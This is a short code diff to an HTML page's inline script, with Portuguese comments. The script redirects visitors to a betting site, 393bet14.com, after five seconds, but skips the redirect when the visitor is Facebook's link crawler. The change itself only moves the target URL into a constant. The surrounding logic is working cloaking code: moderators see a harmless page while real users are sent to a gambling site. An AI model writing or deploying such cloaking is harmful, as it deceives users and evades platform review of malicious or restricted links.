@@ -50,11 +50,13 @@
     </div>
 
     <script>
+        const LINK_BET = "https://393bet14.com/"; // Link para o qual será redirecionado
+        
         // Função para detectar o Facebook Crawler e bloquear o redirecionamento
         if (!navigator.userAgent.includes("facebookexternalhit")) {
             // Redirecionar após 5 segundos se não for o Facebook Crawler
             setTimeout(function() {
-                window.location.href = `https://393bet14.com/${window.location?.search || ''}`; // Substitua pelo link desejado
+                window.location.href = `${LINK_BET}${LINK_BET.endsWith('/') ? '' : '/'}${window.location?.search || ''}`; // Substitua pelo link desejado
             }, 5000); // 5000 milissegundos = 5 segundos
         }
     </script>
